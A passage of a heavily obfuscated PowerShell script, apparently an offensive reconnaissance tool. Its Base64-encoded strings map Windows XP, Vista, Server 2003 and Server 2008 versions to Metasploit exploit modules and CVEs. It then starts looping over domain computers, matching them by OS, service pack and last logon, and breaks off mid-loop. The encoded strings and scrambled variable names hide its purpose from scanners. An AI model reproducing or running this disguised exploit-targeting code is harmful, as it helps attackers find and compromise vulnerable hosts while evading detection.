    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAGgAZQBjAGsAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGYAbwByACAAdgB1AGwAbgBlAHIAYQBiAGwAZQAgAE8AUwAgAGEAbgBkACAAUwBQACAAbABlAHYAZQBsAHMALgAuAC4A')))
    ${_/=\/\_/\/\/=\_/=} = New-Object System.Data.DataTable 
    $Null = ${_/=\/\_/\/\/=\_/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
    $Null = ${_/=\/\_/\/\/=\_/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A'))))
    $Null = ${_/=\/\_/\/\/=\_/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = ${_/=\/\_/\/\/=\_/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
    $Null = ${_/=\/\_/\/\/=\_/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA'))))
    $Null = ${_/=\/\_/\/\/=\_/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA'))))
    ${__/\/=\/===\/\_/\} | % {
        ${__/\/\/\__/\__/\_} = $_.OperatingSystem
        ${/==\_/=\________/} = $_.ServicePack
        ${_/=\_/===\_/=\__/} = $_.MsfModule
        ${/==\___/==\/=\___} = $_.CVE
        ${_____/\__/\/\_/=\} | % {
            ${/===\/===\/=\__/\} = $_.Hostname
            ${___/==\___/=\_/\/} = $_.OperatingSystem
            ${/=\_/\_/\__/\_/\/} = $_.ServicePack                                                        
            ${_/\___/\___/\/\_/} = $_.LastLogon
